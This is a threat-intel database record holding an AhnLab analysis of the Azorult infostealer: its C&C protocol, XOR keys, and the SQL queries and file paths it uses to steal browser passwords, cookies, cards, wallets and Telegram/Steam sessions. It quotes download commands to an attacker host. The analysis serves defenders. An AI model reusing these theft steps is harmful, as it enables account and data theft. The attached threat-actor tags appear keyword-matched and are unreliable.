{
    "id": "2fd01029-c274-42ec-a961-561b98dc1b09",
    "created_at": "2023-01-12T15:10:49.435195Z",
    "updated_at": "2025-03-27T02:15:35.723746Z",
    "deleted_at": null,
    "sha1_hash": "39ecfaad483c57532c9a6617bf418121f987b460",
    "title": "2021-08-18 - Infostealer Malware Azorult Being Distributed Through Spam Mails",
    "authors": "",
    "file_creation_date": "2022-05-28T23:14:40Z",
    "file_modification_date": "2022-05-28T23:14:40Z",
    "file_size": 2048623,
    "plain_text": "# Infostealer Malware Azorult Being Distributed Through Spam Mails\n\n**asec.ahnlab.com/en/26517/**\n\nAugust 18, 2021\n\nThe ASEC analysis team recently discovered that Azorult malware is being distributed through spam\nmails. Azorult is a kind of Infostealer that accesses a C&C server to receive DLL files and commands\nused to leak information, and steals information such as user data files and account information to\nleak it to the server. Besides account information of web browsers and email clients, screenshots,\ncryptocurrency information, and files designated by the attacker with certain paths and extensions can\nbe collected as well.\n\nBecause downloaded commands support a feature to download additional malware, Azorult can also\nact as a downloader. Once all these processes are done, it deletes itself after leaking information and\nacting as a downloader, which makes it different from other types of malware. It does not support\nmethods of operation after reboot such as registering a Run key. This means that the malware is\ndeleted after simply leaking information instead of performing additional behaviors by receiving\ncommands from the attacker while staying hidden. Of course, since it can download additional\nmalware, it can act as a medium for other types of malware.\n\n\n-----\n\nFigure 1. Azorult distributed through spam mails\nAs shown in Figure 1, Azorult is mainly distributed through attached files of spam mails. Since AhnLab\nonce received a compressed file named “Estimate Request_Construction Floor Plan.7z,” we can find\nout that Korean users are also targets for the attack.\n\n## 1. Reset\n\nAzorult creates a mutex when it is executed. The string used is created with the following process.\nFirst, the malware seeks the privilege of the current process. The attached file is usually doubleclicked, so it is executed as a child process of explorer.exe and belongs to a user group. If it is run\nwith an administrator privilege, it belongs to an Administration group. It might be even run with a\nsystem privilege in some cases. It returns S, A, U, and G for each function shown below.\n\nFigure 2. Obtaining\n\nprivilege information\nAlso, for MachineGuid, ProductName, UserName, and ComputerName as well as strings added with\nthe previously mentioned 4 strings, the malware uses a different algorithm for each string to create a\nstring as shown below. The function is continuously used later in moments such as sending packets.\n\n[Machine Guid-based]-[Product Name-based]-[User Name-based]–[Computer Name-based]-[4\nStrings-based]\n\nEx) 112xxx26-86C3DFC7-8EBxxx77-DBxxxA24-C539B8C2\n\n\n-----\n\nFigure 3. Creating\n\nunique string\nThe string that means the privilege found before (one of the characters S|A|U|G) plus the unique\nstring shown above is the string used for creating a mutex. The malware then decodes the encrypted\nC&C server URL. Lastly, it finds the data to be sent when requesting the C&C server.\n\nThis data combines the 0x0355AE data which is the 3-byte XOR key and the unique string created\nfrom before that is URL-encoded. Before requesting the C&C server, Azorult sends the data encoded\nwith the key to the server. XOR key is also sent because the C&C server needs to decode what it has\nreceived. Or it might also be that the key is sent to allow the server to encode the data it will send.\n\nFigure 4. Encoded unique string used when requesting POST to C&C\n\nserver\n\n## 2. Downloading Commands and DLL Files\n\n2.1. Decoding\n\nThe malware for the current analysis target received about 4,369KB of encoded data (0x444340) from\nthe C&C server. The data includes commands from the C&C server, multiple DLL files to be used for\nleaking information, and the string data that the malware will use.\n\n\n-----\n\nFigure 5. Encoded data received from C&C server\nThe encoding method is XOR, with 3 bytes XOR used for requesting C&C and additional 4 bytes XOR\ndecoding used. As you can see below, the first 0x80000 size of the initially encoded data is decoded\nwith the hard-coded key value of 0x0355AE. This process is the same as the one previously\nprocessed for requesting the C&C server. As such, the entire C&C command located at the very front\n(existing in between tags <c> and </c>), as well as some parts of the DLL data, is decrypted. The\ndecrypted result is the string encoded with the Base64 encryption.\n\nFigure 6. XOR\n\ndecoding process\nNext, the DLL data which was partially decoded (0x80000 starting from the tag <n>) and the DLL data\nthat was not decoded (up to the tag </n>) are decoded with the 4 bytes XOR key. The key used in this\nprocess is 0xC8653001. Lastly, there is the string data in between tags <d> and </d>. It is not XOR\ndecoded like the C&C command and exists as the Base64 encoded string form.\n\n\n-----\n\nFigure 7. Decoded C&C command – existing in Base64 string form in between tags <c> and </c>\n2.2. Decoded data\n\n**a. Command**\n\nThe command of the C&C server exists in between tags <c> and </c>. The XOR decoding result\nshows a string encoded with Base64. Decoding this command with Base64 shows the following\ncommands.\n\nThe current analysis target Azorult 6a4824ab00e63c2f1bbf29a24d78b2a4 receives a short command\nas you can see above, but another type of Azorult (c0e0a9d259bbf9faab7fd5049bf6b662) receives a\ncommand as shown below.\n\n\n-----\n\nAzorult 1 ]\n\n– MD5: 6a4824ab00e63c2f1bbf29a24d78b2a4\n\n– C&C Server URL: http://ciuj[.]ir/masab/index.php\n\nAzorult 2 ]\n\n– MD5: c0e0a9d259bbf9faab7fd5049bf6b662\n\n– C&C Server URL: http://jamesrlongacre[.]ug/index.php\n\nThe 10 combinations of + and – in the first string are lists of flags that determine the enable status of\nvarious information leaking features existing in Azorult. + means enabled, while – means disabled.\nThe flags will be discussed in detail in the information leak part.\n\nNext, the lines starting with F, I, and L mean each command. The F command can designate target\npaths and extensions to additionally leak user data. The I command can lookup a user’s IP address.\nFinally, the L command acts as a downloader, downloading additional malware. Each command will\nbe discussed in detail in the C&C command part.\n\n**b. DLL files with the information leak feature**\n\nDLL files were included in between tags <n> and </n> and encoded with the XOR key. The files\ndecoded with the XOR process mentioned above exist in the form [DLL name]:[DLL binary]\n<separator>[DLL name]…. Let’s look at the example below. The DLL existing after the DLL separator\n“|||<[{99C3}]>|||” has the name of “api-ms-win-core-datetime-l1-1-0.dll.” After “:” comes the actual DLL\nbinary.\n\nFigure 8.\n\nDecoded DLL data – Separator, DLL name, and DLL binary\n\n\n-----\n\nThere are 48 decoded DLL files existing in the form shown above, which are dropped in the path\n\\AppData\\Temp\\[Unique]\\. These files are loaded before leaking information and then used. See\nbelow for the list.\n\napi-ms-win-core-console-l1-1-0.dll\napi-ms-win-core-datetime-l1-1-0.dll\napi-ms-win-core-debug-l1-1-0.dll\napi-ms-win-core-errorhandling-l1-1-0.dll\napi-ms-win-core-file-l1-1-0.dll\napi-ms-win-core-file-l1-2-0.dll\napi-ms-win-core-file-l2-1-0.dll\napi-ms-win-core-handle-l1-1-0.dll\napi-ms-win-core-heap-l1-1-0.dll\napi-ms-win-core-interlocked-l1-1-0.dll\napi-ms-win-core-libraryloader-l1-1-0.dll\napi-ms-win-core-localization-l1-2-0.dll\napi-ms-win-core-memory-l1-1-0.dll\napi-ms-win-core-namedpipe-l1-1-0.dll\napi-ms-win-core-processenvironment-l1-1-0.dll\napi-ms-win-core-processthreads-l1-1-0.dll\napi-ms-win-core-processthreads-l1-1-1.dll\napi-ms-win-core-profile-l1-1-0.dll\napi-ms-win-core-rtlsupport-l1-1-0.dll\napi-ms-win-core-string-l1-1-0.dll\napi-ms-win-core-synch-l1-1-0.dll\napi-ms-win-core-synch-l1-2-0.dll\napi-ms-win-core-sysinfo-l1-1-0.dll\napi-ms-win-core-timezone-l1-1-0.dll\napi-ms-win-core-util-l1-1-0.dll\napi-ms-win-crt-conio-l1-1-0.dll\napi-ms-win-crt-convert-l1-1-0.dll\napi-ms-win-crt-environment-l1-1-0.dll\napi-ms-win-crt-filesystem-l1-1-0.dll\napi-ms-win-crt-heap-l1-1-0.dll\napi-ms-win-crt-locale-l1-1-0.dll\napi-ms-win-crt-math-l1-1-0.dll\napi-ms-win-crt-multibyte-l1-1-0.dll\napi-ms-win-crt-private-l1-1-0.dll\napi-ms-win-crt-process-l1-1-0.dll\napi-ms-win-crt-runtime-l1-1-0.dll\napi-ms-win-crt-stdio-l1-1-0.dll\napi-ms-win-crt-string-l1-1-0.dll\napi-ms-win-crt-time-l1-1-0.dll\napi-ms-win-crt-utility-l1-1-0.dll\nfreebl3.dll\nmozglue.dll\nmsvcp140.dll\nnss3.dll\nnssdbm3.dll\nsoftokn3.dll\nucrtbase.dll\nvcruntime140.dll\n\n\n-----\n\n**c. String data**\nFor programs to perform certain features, they need data like strings and codes. The same goes for\nmalware. If there are strings in the data area of the malware without any modification, it becomes\neasier to figure out its features. So most types of malware have their strings encoded and use them\nafter they are decoded during the execution process.\n\nAzorult is unique in that it does not have most of its strings used in its malicious behaviors in the\nbinary but receives them from the C&C server: strings that are targets for information leak such as\n“GoogleChrome” and “firefox,” API strings used for leaking information such as “sqlite3_open” and\n“sqlite3_prepare_v2,” and SQL queries.\n\nThe string data is not encoded with the XOR key and exists as the Base64 string in between tags <d>\nand </d>. If you decode the Base64 string, you can see 208 strings as shown below.\n\nFigure 9.\n\nString data encoded with Base64 and existing in between tags <d> and </d>\n\nFigure 10. Decoded\n\nstring data\n\n## 3. Stealing Information\n\n\n-----\n\nAzorult decodes DLL files used to leak information. It then drops and loads them, seeking the API\nURLs that will be used for the leak. Afterward, it steals information following flags related to\ninformation leakage received from the C&C server as you can see below. There are 10 flags in total.\nEach enables or disables a certain feature.\n\nFlag: ++++++++-+\n\n**Order** **Features**\n\n0 Unconfirmed\n\n1 Information of various application accounts\n\n2 Web browser Cookie and AutoComplete\n\n3 Coin\n\n4 Skype History\n\n5 Telegram\n\n6 Steam\n\n7 Screenshots\n\n8 Auto-delete\n\n9 Web browser History\n\nTable 1. Flags for enabling information leakage feature\nThe files are saved as a compressed file of the ZIP format in the memory. It is not dropped as a file\nand exists only in the memory. Yet upon extracting the .zip from the memory before it is sent to the\nC&C server, you can find the following list of collected information.\n\n\\\n…. \\Browsers\\\n…….. \\Browsers\\Cookies\\\n…….. \\Browsers\\AutoComplete\n…….. \\Browsers\\History\\\n…. \\Skype\\\n…. \\Telegram\\\n…. \\Steam\\\n…….. \\Steam\\Config\\\n…. \\Files\\\n…….. \\Files\\User designated directory\\Data to be leaked\n…. PasswordsList.txt\n…. CookieList.txt\n…. Scr.jpg\n…. ip.txt\n…. System.txt\n\n\n-----\n\nFigure 11. Zip file containing stolen user information\n\n3.1. ACCOUNT INFORMATION\n\n– zip file save path: \\PasswordsList.txt\nAzorult steals account information from various programs. The following list shows programs that are\ntargeted. Note that properties discussed in web browser parts such as Cookie and History are the\nsame for Chromium-based and Mozilla-based web browsers shown below.\n\n**a. Web Browser**\n– Targeted programs: Internet Explorer, Vault (including the latest version of IE and past versions of\nEdge), Chromium-based web browsers (GoogleChrome, GoogleChrome64, InternetMailRu,\nYandexBrowser, ComodoDragon, Amigo, Orbitum, Bromium, Chromium, Nichrome, RockMelt,\n360Browser, Vivaldi, Opera, GoBrowser, Sputnik, Kometa, Uran, QIPSurf, Epic, Brave, CocCoc,\nCentBrowser, 7Star, ElementsBrowser, TorBro, Suhba, SaferBrowser, Mustang, Superbird, Chedot,\nand Torch), and Mozilla-based web browsers (MozillaFireFox, Waterfox, IceDragon, Cyberfox, and\nPaleMoon)\n\nIn past versions of Internet Explorer (7 and 8), the AutoComplete password was saved in the registry\nHKCU\\Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2. The key’s values are the hash\nvalues of website URLs that correspond to account information, with the data of the value being the\naccount information. The data is encoded using DPAI. To decode it, one must know what website is\nmatched to the key.\n\nTo know the information, Azorult uses the CUrlHistory COM object as shown below to know the\nHistory of IE.\n– CUrlHistory CLSID: 3C374A40-BAE4-11CF-BF7D-00AA006946EE\n– IUrlHistoryStg2 IID: AFA0DC11-C313-11d0-831A-00C04FD5AE38\n\n\n-----\n\nFigure 12. Routine for knowing History of IE\nIt obtains the user account information saved in IE with the method of using URLs found in IE History\nto know the values saved in \\IntelliForms\\Storage2 with the CryptUnprotectData() API. It then steals\naccount information of the Edge web browser saved in Windows Vault.\n\nFigure 13. Routine for stealing account information of Windows Vault\nLet’s have Google Chrome as an example among Chromium-based web browsers. The malware\nextracts the account information from the \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login\nData file with the following SQL query.\n\n- SELECT origin_url, username_value, password_value FROM logins\n\nFigure 14. Routine for stealing account information of Chromium\n\n\n-----\n\nLet s have Mozilla Firefox as an example among Mozilla-based web browsers. The malware reads the\nlogins.json file existing in paths such as \\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\wz0irceq.defaultrelease. The file is a text format, parsing strings for items such as hostname, encryptedUsername,\nand encryptedPassword. encryptedUsername and encryptedPassword are strings encoded with\nBase64. As for their decoded results, they can be decrypted with functions of nss3.dll such as\nPK11_GetInternalKeySlot(), PK11_Authenticate(), and PK11SDR_Decrypt() to know the original\naccount information.\n\n**b. Email Client**\n– Targeted programs: Outlook and Thunderbird\n\nAs Thunderbird is Mozilla-based, the same method mentioned for Firefox above is used. For Outlook,\nthe malware extracts values such as EMAIL, POP3, IMAP, SMTP, and HTTP from registry keys shown\nbelow.\n\nFigure 15. Routine for stealing account information of Outlook\n\n**c. Others**\n\n– targeted instant message programs: Psi+ and Pidgn\n\n– targeted FTP client programs: FileZilla and WinSCP\n\nFigure 16. Routine for stealing account information of WinSCP\n\n3.2. Web Browser Cookie\n\n– zip file save path: \\CookieList txt and \\Browsers\\Cookies\\[file that will be leaked] txt\n\n\n-----\n\nIf flags for Cookie and AutoFill are enabled, the malware steals Cookie files of IE, Edge, Chromiumbased web browsers, and Mozilla-based web browsers. For IE and Edge, it steals *.txt files and\n*.cookie files from the following paths.\n\n\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\\n\\AppData\\Roaming\\Microsoft\\Windows\\Cookies\\Low\\\n\\AppData\\Local\\Microsoft\\Windows\\INetCache\\\n\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\INetCookies\\\n\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC#!001\\MicrosoftEdge\\Cookies\\\n\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC#!002\\MicrosoftEdge\\Cookies\\\n\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\AC\\MicrosoftEdge\\Cookies\\\n\nLet’s have Google Chrome as an example among Chromium-based web browsers. The malware\nextracts information from the \\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies file with one\nof the following 2 SQL queries.\n\n- SELECT host_key, name, encrypted_value, value, path, secure,\n(expires_utc/1000000)-11644473600 FROM cookies\n\n- SELECT host_key, name, name, value, path, secure, expires_utc FROM cookies\n\nLet’s have Mozilla Firefox as an example among Mozilla-based web browsers. The malware extracts\ninformation from the cookies.sqlite file existing in paths such as\n\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\wz0irceq.default-release with the following SQL query.\n\n- SELECT host, path, isSecure, expiry, name, value FROM moz_cookies\n\n3.3. Web Browser AutoComplete\n\n– zip file save path: \\Browsers\\AutoComplete\\[file that will be leaked].txt\n\nIf flags for Cookie and AutoFill are enabled, the malware steals AutoFill records of Chromium-based\nand Mozilla-based web browsers. Let’s have Google Chrome as an example among Chromium-based\nweb browsers. The malware extracts information from the \\AppData\\Local\\Google\\Chrome\\User\nData\\Default\\Web Data file with the following SQL query.\n\n- SELECT name, value FROM autofill\n\nIn Chromium-based web browsers, CreditCard information also becomes a target to be stolen.\nFollowing the same process, the malware extracts information from the\n\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data file with the following SQL query.\n\n- SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted value FROM\ncredit_cards\n\nLet’s have Mozilla Firefox as an example among Mozilla-based web browsers. The malware extracts\ninformation from the formhistory.sqlite file existing in paths such as\n\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\wz0irceq.default-release with the following SQL query.\n\n- SELECT fieldname, value FROM moz_formhistory\n\n\n-----\n\n3.4. Web Browser History\n\n– zip file save path: \\Browsers\\History\\[file that will be leaked].txt\n\nIf the flag for History is enabled, the malware steals History records of Chromium-based and Mozillabased web browsers. Let’s have Google Chrome as an example among Chromium-based web\nbrowsers. The malware extracts information from the \\AppData\\Local\\Google\\Chrome\\User\nData\\Default\\History file with the following SQL query.\n\n- SELECT DATETIME( ((visits.visit_time/1000000)-11644473600),\\”unixepoch\\”), urls.title, urls.url\nFROM urls, visits WHERE urls.id = visits.url ORDER By visits.visit_time DESC LIMIT 0, 10000\n\nLet’s have Mozilla Firefox as an example among Mozilla-based web browsers. The malware extracts\ninformation from the places.sqlite file existing in paths such as\n\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\wz0irceq.default-release with the following SQL query.\n\n- SELECT DATETIME(moz_historyvisits.visit_date/1000000, \\”unixepoch\\”,\n\\”localtime\\”),moz_places.title,moz_places.url FROM moz_places, moz_historyvisits WHERE\nmoz_places.id = moz_historyvisits.place_id ORDER By moz_historyvisits.visit_date DESC LIMIT 0,\n10000\n\nFigure 17. Routine for stealing information of Firefox History\n\n3.5. Coin Wallet\n\nzip file save path: \\Coins\\autoscan\\ and \\Coins\\Monero\\\n\nIf the flag for Coin is enabled, the malware steals wallet files for various types of cryptocurrency. First,\nfiles saved in the \\Coins\\autoscan\\ folder are those that fit the following conditions as the malware\nlookups paths within the \\AppData\\Roaming\\ folder.\n– “.wallet,” “wallets\\.wallet,” “wallet.dat,” “wallets\\wallet.dat,” “electrum.dat,” and “wallets\\electrum.dat”\n\nNext, files saved in the \\Coins\\Monero\\ folder are those that have their paths known by the malware\nreferencing the wallet_path data of the HKCU\\Software\\monero-project\\monero-core key, those that\nhave .address.txt name added to the previous files and those that have .keys added to their names.\nAfterward, the malware also steals wallet.dat files and \\wallets\\wallet.dat files from the paths known by\nreferencing the strDataDir data from the following registry keys.\n\n\n-----\n\nHKCU\\Software\\Bitcoin\\Bitcoin-Qt\nHKCU\\Software\\BitcoinGold\\BitcoinGold-Qt\nHKCU\\Software\\BitCore\\BitCore-Qt\nHKCU\\Software\\Liteoin\\Litecoin-Qt\nHKCU\\Software\\BitcoinABC\\BitcoinABC-Qt\n\nLastly, it steals the following cryptocurrency wallet files existing in paths of \\AppData\\Roaming\\ such\nas \\AppData\\Roaming\\Electrum\\wallets\\.\n– Electrum, Electrum-LTC, ElectrumG, Electrum-btcp, Ethereum, Exodus, Exodus Eden, Jaxx, and\nMultiBitHD\n\n3.6. Skype\n\n– zip file save path: \\Skype\\\n\nIf the Skype flag is enabled, the malware steals the main.db file from the \\AppData\\Roaming\\Skype\\\npath. When users use Skype, the logs are saved in the main.db file. Certain tools can be used to\nrestore the Skype record with the file. This means that when the attacker steals the file, Skype-related\ninformation such as Skype chat history can be leaked.\n\nFigure 18.\n\nRoutine for stealing Skype’s main.db file\n\n3.7. Telegram\n\n– zip file save path: \\Telegram\\\n\nIf the Telegram flag is enabled, the malware steals files starting with “D877F783D5” and “map”\nexisting in the \\AppData\\Roaming\\Telegram Desktop\\tdata\\ path. These files are settings files related\nto sessions existing in the Telegram PC version and can be exploited by the attacker for stealing\nsessions.\n\n\n-----\n\nFigure 19. Routine for stealing Telegram’s\n\nsession data file\n\n3.8. Steam\n\n– zip file save path: \\Steam\\Config\\[*.vdf], \\Steam\\[ssfn*]\n\nIf the Steam flag is enabled, the malware obtains the Steam path by referencing the SteamPath value\nof the HKCU\\Software\\Valve\\Steam key and steals “ssfn*” files existing in the path and “*.vdf” files\nexisting in the internal Config folder. These files have the information of sessions and settings of the\nSteam client. The attacker can exploit these files to access a user’s Steam account.\n\nFigure 20.\n\nRoutine for stealing information of Steam session information\n\n3.9. Screenshots\n\n– zip file save path: \\scr.jpg\n\nIf the screenshot flag is enabled, the malware takes a screenshot of the current screen and saves it in\nthe compressed file with the name scr.jpg.\n\n3.10. System Info\n\n– zip file save path: \\System.txt\n\nAzorult obtains various types of system info and leaks them regardless of C&C commands by default.\nThe following shows the types of information that are leaked.\n\nMachineID, Malware path, Windows version, Computer name, Resolution, Language, Time, Time\nZone, CPU model, Number of CPUs, RAM size, Video card information, List of currently running\nprocesses, and List of installed programs\n\n\n-----\n\nFigure 21. Collected System info\n\n## 4. C&C Command\n\n4.1. Command – F\n\n– zip file save path: \\Files\\[user designated path name]\\[file that will be leaked].txt\n\nThe F command collects files from the user PC and receives settings for the path and extensions. The\nfollowing shows 2 examples among F commands received from the C&C server.\n\nThe format is as follows:\n\n[ F \\t <name of the compressed file> \\t <path> \\t <extension> \\t <max size> \\t <subfolder> \\t\n<shortcut> \\t <exception path> ]\n\n\n-----\n\nThe files collected by the F command are located at the Files\\ path inside the compressed file and\nsaved in the folder with the name of the compressed file designated by the command. For instance,\nthe first command has the data saved in the DOC TXT folder. For paths, environment variables such\nas %USERPROFILE% and the drive paths starting with “DSK_” are supported. By designating the\nroute path and calling the GetDriveTypeA() function, the command can return the type of the drive\npath. 2 means removable storage devices such as USB, 3 means normal drives, and 5 means CDROM drives. So in the example above, %DSK_23% means that the command will target normal hard\ndrives and USB drives to leak files.\n\nFigure 22. F\n\ncommand – collecting files\nThe third part is about extensions of files that will be collected, and the fourth part is the max size of\nthe collected files in the KB unit. Next are 2 flags +|-. The first one decides whether files within\nsubdirectories will be collected or not, and the second one decides if shortcut files (.lnk files) will be\ncollected or not. The keywords located at the last part are the names of folder paths that will not be\ncollected for information leaks.\n\n4.2. Command – L\n\nAnother Azorult mentioned above received the L command as shown below.\n\nL http://jamesrlongacre[.]ug/ds2.exe – *\nL http://jamesrlongacre[.]ug/ds1.exe – *\nL http://jamesrlongacre[.]ug/rc.exe – *\nL http://jamesrlongacre[.]ug/ac.exe – *\n\nThe L command consists of the form <L> \\t <URL> \\t <+|-> \\t <*|URL>. The +|- flags of the third part\ndecide the status of the SW_HIDE flag when downloaded files are executed. If the flag is +\n(SW_HIDE), the files will be run with their properties hidden.\n\nFor the fourth part, the 2 files all received * as the command, but they can download particular URLs.\nThey only download additional malware if the current list of Cookies includes the keyword. As for the\ncurrent command *, it downloads files regardless of Cookies. Suppose the command received the\nkeyword “AHNLAB.” The following shows the routine of inspecting the keyword in the list of Cookies.\n\n\n-----\n\nFigure 23. Routine\n\nfor comparing the list of Cookies\nThe downloaded files are saved in the name of the URL in the Temp path. If there are files with the\nsame name, the files are downloaded in the ProgramData path instead. If the extension of the\ndownloaded files is .exe, the command runs them using the CreateProcessW() function. If not, the\nfiles are run using the ShellExecuteExW() function. The process is repeated for each L command.\n\nFigure 24. Downloader routine\n\n4.3. Command – l\n\n– zip file save path: \\ip.txt\n\nThe I command received from the current C&C server had the IP address and country code of the\ninfected PC. In this case, the received information is simply saved as the ip.txt file.\n\nI xxx.xxx.xx7.166:KR\n\n\n-----\n\nIf there is no IP and country code information of the infected PC in the I command (receiving ? ), the\n[command obtains information by making a query to http://ip-api.com/json and parses the information](http://ip-api.com/json)\nto save it as the ip.txt file.\n\nFigure 25.\n\nStealing IP information\n\n## 5. Leaking Collected Information\n\nAfter obtaining all types of information, Azorult creates a packet to be sent to the C&C server as\nshown below. The structure of the packet is as follows. The strings attached before the zip file are all\nURL-encoded. The separator is the string “2C5A87CB-758C-7293-47BC-475C65D699A584C5-7DC6DC45-12A47C7DB587-F89F-78CD-96CA-FD478543C7F4” which is hard-coded in the binary.\n\n<system info> [separator][separator] <stolen account information> [separator][separator] <stolen\nCookies information> [separator][separator] <compressed file>\n\nFigure 26. Packet data\n\nbefore it is XOR-encoded\nThe first size of 0x80000 is decrypted with the 3 bytes XOR key, just like how the C&C command was\ndecrypted. The key used here is also 0x0355AE. After sending the XOR-encoded data to the server,\nthe malware uses the L command that it received before to perform downloader behaviors.\n\n\n-----\n\nFigure 27. Routine for C&C communications and downloading additional malware\n\n## 6. Conclusion\n\nAzorult malware is distributed through spam mails. Therefore, when there is a suspicious-looking\nemail in the inbox, users must refrain from opening the attachment files within the email. Also, V3\nshould be updated to the latest version so that malware infection can be prevented.\n\n**[File Detection]**\n\n– Trojan/Win32.Kryptik.C4217978\n\n– Malware/Win32.RL_Generic.R354530\n\n**[Behavior Detection]**\n\n– Malware/MDP.Behavior.M3108\n\n**[IOC]**\n\n**– File**\n\n6a4824ab00e63c2f1bbf29a24d78b2a4\n\nc0e0a9d259bbf9faab7fd5049bf6b662\n\n**– C&C URL**\n\nhxxp://ciuj[.]ir/masab/index.php\n\nhxxp://jamesrlongacre[.]ug/index.php\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information/)\n\n[Tagged as:Azorult,](https://asec.ahnlab.com/en/tag/azorult-en/) [InfoStealer,](https://asec.ahnlab.com/en/tag/infostealer-en/) [SPAMMAIL](https://asec.ahnlab.com/en/tag/spammail-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-18 - Infostealer Malware Azorult Being Distributed Through Spam Mails.pdf"
    ],
    "report_names": [
        "2021-08-18 - Infostealer Malware Azorult Being Distributed Through Spam Mails.pdf"
    ],
    "threat_actors": [
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a66438a8-ebf6-4397-9ad5-ed07f93330aa",
            "created_at": "2022-10-25T16:47:55.919702Z",
            "updated_at": "2025-03-27T02:05:17.412024Z",
            "deleted_at": null,
            "main_name": "IRON VIKING",
            "aliases": [
                "ATK14 ",
                "BlackEnergy Group",
                "Blue Echidna ",
                "CTG-7263 ",
                "ELECTRUM ",
                "FROZENBARENTS ",
                "Hades/OlympicDestroyer ",
                "IRIDIUM ",
                "Qudedagh ",
                "Sandworm Team ",
                "Seashell Blizzard ",
                "TEMP.Noble ",
                "Telebots ",
                "Voodoo Bear ",
                "APT44 "
            ],
            "source_name": "Secureworks:IRON VIKING",
            "tools": [
                " BlackEnergy",
                " GCat",
                " GreyEnergy",
                " Industroyer",
                " KillDisk",
                " NotPetya",
                " PSCrypt",
                " TeleBot",
                " TeleDoor",
                " xData",
                "BadRabbit"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "b3e954e8-8bbb-46f3-84de-d6f12dc7e1a6",
            "created_at": "2022-10-25T15:50:23.339976Z",
            "updated_at": "2025-03-27T02:00:55.446795Z",
            "deleted_at": null,
            "main_name": "Sandworm Team",
            "aliases": [
                "Sandworm Team",
                "ELECTRUM",
                "Telebots",
                "IRON VIKING",
                "BlackEnergy (Group)",
                "Quedagh",
                "Voodoo Bear",
                "IRIDIUM",
                "Seashell Blizzard",
                "FROZENBARENTS",
                "APT44"
            ],
            "source_name": "MITRE:Sandworm Team",
            "tools": [
                "Bad Rabbit",
                "Mimikatz",
                "Exaramel for Linux",
                "Exaramel for Windows",
                "GreyEnergy",
                "PsExec",
                "Prestige",
                "P.A.S. Webshell",
                "VPNFilter",
                "Cyclops Blink",
                "SDelete",
                "AcidRain",
                "Industroyer",
                "Industroyer2",
                "BlackEnergy",
                "Cobalt Strike",
                "NotPetya",
                "KillDisk",
                "PoshC2",
                "Impacket",
                "Invoke-PSImage",
                "Olympic Destroyer"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "Bronze University",
                "Charcoal Typhoon",
                "Chromium",
                "Red Dev 10",
                "Red Scylla"
            ],
            "source_name": "ETDA:Earth Lusca",
            "tools": [
                "Agentemis",
                "AntSword",
                "BIOPASS",
                "BIOPASS RAT",
                "BadPotato",
                "Behinder",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "Doraemon",
                "FRP",
                "Fast Reverse Proxy",
                "FunnySwitch",
                "HUC Port Banner Scanner",
                "KTLVdoor",
                "Mimikatz",
                "NBTscan",
                "POISONPLUG.SHADOW",
                "PipeMon",
                "RbDoor",
                "RibDoor",
                "RouterGod",
                "SAMRID",
